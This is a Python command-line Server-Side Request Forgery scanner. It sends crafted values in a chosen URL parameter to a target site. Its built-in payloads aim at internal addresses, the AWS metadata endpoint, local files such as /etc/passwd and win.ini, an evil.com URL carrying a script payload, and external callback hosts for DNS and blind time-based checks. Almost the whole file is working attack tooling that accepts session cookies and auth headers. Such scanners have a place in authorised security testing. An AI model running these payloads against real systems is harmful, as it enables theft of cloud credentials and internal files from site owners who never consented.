import requests
import logging
import argparse
import time
import os


class Logger:
    @staticmethod
    def setup_logger():
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[logging.FileHandler("ssrf_scanner.log"), logging.StreamHandler()]
        )


class SSRFTester:
    def __init__(self, target_url, param, method, headers, cookies, delay, verbose, payloads, dns_test, time_test):
        self.target_url = target_url
        self.param = param
        self.method = method
        self.headers = headers
        self.cookies = cookies
        self.delay = delay
        self.verbose = verbose
        self.payloads = payloads
        self.dns_test = dns_test
        self.time_test = time_test

    def send_request(self, payload):
        url = self.target_url.replace(f"{self.param}=", f"{self.param}={payload}") if f"{self.param}=" in self.target_url else f"{self.target_url}?{self.param}={payload}"
        
        try:
            if self.verbose:
                logging.info(f"[*] Testing payload: {payload}")

            start_time = time.time()
            
            if self.method == "GET":
                response = requests.get(url, headers=self.headers, cookies=self.cookies, timeout=10)
            else:
                response = requests.post(self.target_url, data={self.param: payload}, headers=self.headers, cookies=self.cookies, timeout=10)

            elapsed_time = time.time() - start_time

            if response.status_code == 200:
                logging.info(f"[+] Possible SSRF! Payload: {payload} | Status: 200")
            elif response.status_code in [301, 302]:
                logging.warning(f"[!] Redirect detected. Payload: {payload} | Redirects to: {response.headers.get('Location')}")
            else:
                logging.info(f"[-] No SSRF detected. Payload: {payload} | Status: {response.status_code}")

            return elapsed_time, response
        except requests.exceptions.RequestException as e:
            logging.error(f"[-] Request failed for payload: {payload} | Error: {e}")
            return None, None

    def test_dns_rebinding(self):
        dns_payloads = [
            "http://rebind.network/",
            "http://burpcollaborator.net/",
            "http://dnsbin.zhack.ca/",
            "http://canarytokens.com/"
        ]
        
        logging.info("[+] Running DNS Rebinding Tests...")
        for payload in dns_payloads:
            self.send_request(payload)
            time.sleep(self.delay)

    def test_time_based_ssrf(self):
        slow_endpoints = [
            "http://localhost:22/",  # SSH (may be closed)
            "http://127.0.0.1:81/",  # Non-standard HTTP port
            "http://10.10.10.10:8080/",  # Common internal IP
            "http://192.168.1.1/",  # Router admin panel
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        ]

        logging.info("[+] Running Time-Based SSRF Tests...")
        for payload in slow_endpoints:
            elapsed_time, _ = self.send_request(payload)
            if elapsed_time and elapsed_time > 5:
                logging.warning(f"[!] Possible Blind SSRF! Payload: {payload} | Response Time: {elapsed_time:.2f} sec")
            time.sleep(self.delay)

    def run_tests(self):
        logging.info(f"[+] Starting SSRF tests on {self.target_url}")
        
        # Test user-provided payloads
        for payload in self.payloads:
            self.send_request(payload)
            time.sleep(self.delay)

        # Test DNS Rebinding
        if self.dns_test:
            self.test_dns_rebinding()

        # Test Time-Based SSRF
        if self.time_test:
            self.test_time_based_ssrf()

        logging.info("[+] SSRF testing complete.")


class CLI:
    @staticmethod
    def parse_arguments():
        parser = argparse.ArgumentParser(description="Server-Side Request Forgery (SSRF) Scanner")
        parser.add_argument("-u", "--url", type=str, required=True, help="e.g., http://example.com/api?redirect=")
        parser.add_argument("-p", "--param", type=str, required=True, help="Parameter to test (e.g., 'redirect')")
        parser.add_argument("-m", "--method", type=str, choices=["GET", "POST"], default="GET", help="HTTP method to use (default: GET)")
        parser.add_argument("--header", type=str, help="Custom headers (e.g., 'Authorization: Bearer token')")
        parser.add_argument("--cookie", type=str, help="Session cookies (e.g., 'PHPSESSID=123456')")
        parser.add_argument("-d", "--delay", type=int, default=0, help="Delay between requests (in seconds)")
        parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for detailed output")
        parser.add_argument("--dns", action="store_true", help="Test for DNS rebinding")
        parser.add_argument("--time", action="store_true", help="Test for time-based SSRF")
        parser.add_argument("--wordlist", type=str, help="Path to custom payload wordlist")
        return parser.parse_args()


if __name__ == "__main__":
    try:
        Logger.setup_logger()
        args = CLI.parse_arguments()

        headers = {"User-Agent": "Mozilla/5.0"}
        cookies = {}

        if args.header:
            key, value = args.header.split(": ", 1)
            headers[key] = value

        if args.cookie:
            cookies["Cookie"] = args.cookie

        # Load custom wordlist if provided
        payloads = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://192.168.1.1/",
            "http://10.0.0.1/",
            "http://0.0.0.0/",
            "file:///etc/passwd",
            "file:///C:/Windows/win.ini",
            "http://evil.com/?data=<script>alert('SSRF')</script>"
        ]

        if args.wordlist and os.path.exists(args.wordlist):
            with open(args.wordlist, "r", encoding="utf-8") as file:
                custom_payloads = [line.strip() for line in file if line.strip()]
            payloads.extend(custom_payloads)
            logging.info(f"[+] Loaded {len(custom_payloads)} custom payloads from {args.wordlist}")

        # Run SSRF tests
        tester = SSRFTester(
            target_url=args.url,
            param=args.param,
            method=args.method,
            headers=headers,
            cookies=cookies,
            delay=args.delay,
            verbose=args.verbose,
            payloads=payloads,
            dns_test=args.dns,
            time_test=args.time
        )
        tester.run_tests()

    except KeyboardInterrupt:
        logging.warning("[-] User interrupted. Exiting.")
    except Exception as e:
        logging.error(f"[-] Error: {e}")
